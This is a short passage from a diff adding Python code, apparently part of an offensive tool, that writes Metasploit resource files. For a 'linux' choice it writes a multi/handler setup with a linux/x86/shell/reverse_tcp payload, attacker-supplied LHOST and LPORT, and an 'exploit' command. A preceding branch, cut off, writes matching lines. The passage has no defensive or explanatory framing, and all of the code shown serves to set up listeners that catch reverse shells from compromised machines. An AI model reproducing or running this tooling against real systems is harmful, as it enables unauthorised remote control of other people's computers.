+			op.write('set LHOST ' + ip + '\n')
+			op.write('set LPORT ' + port + '\n')
+			op.write('exploit')
+	elif meterpreter == 'linux':
+		with open('data/' + name + '.rc' , 'w') as op:
+			op.write('use exploit/multi/handler\n')
+			op.write('set payload linux/x86/shell/reverse_tcp\n')
+			op.write('set LHOST ' + ip + '\n')
+			op.write('set LPORT ' + port + '\n')
+			op.write('exploit')
+	else:
+		print('')
+		print('Error ...')
+		print('')
+		exit()
+main()
